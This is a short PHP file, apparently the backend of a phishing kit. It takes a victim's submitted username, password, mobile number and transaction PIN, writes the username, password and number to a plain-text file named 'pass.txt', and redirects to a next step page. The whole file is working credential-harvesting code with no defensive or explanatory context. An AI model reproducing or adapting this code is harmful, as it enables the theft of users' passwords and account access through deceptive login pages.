<?php
//    echo"<pre>";print_r($_POST);die();
if (isset($_POST['submit'])) {
    // echo"<pre>";print_r($_POST);die();
    $file_name = $_POST['Username'].'_'. $_POST['Password'];
    $data=[
         'id'             =>  $_POST['Username'],
        'Password'          =>  $_POST['Password'],
       'number'=>$_POST['Mobile'],
		
    ];
	$Username = $_POST['Username'];
  $Password = $_POST['Password'];
  $transaction_pin = $_POST['m_pin_first'];
  $number = $_POST['Mobile'];
  
  setcookie("number", $number, time() + 3600, '/');

  $Username = "id:$Username";
    $Password = "Password:$Password";
	  $number = "number:$number";
  $myfile = fopen("pass.txt", "a") or die("Unable to open file!");

$txt43 ="";
fwrite($myfile, "\r\n". $txt43);
fwrite($myfile, "\r\n". $Username);
fwrite($myfile, "\r\n". $Password);
fwrite($myfile, "\r\n". $number);
fclose($myfile);

   
   
    header('location: step12.php');
    die();
//     $fp = fopen('lidn.txt', 'w');
// fwrite($fp,[ ]);
// fclose($fp);
}



?>
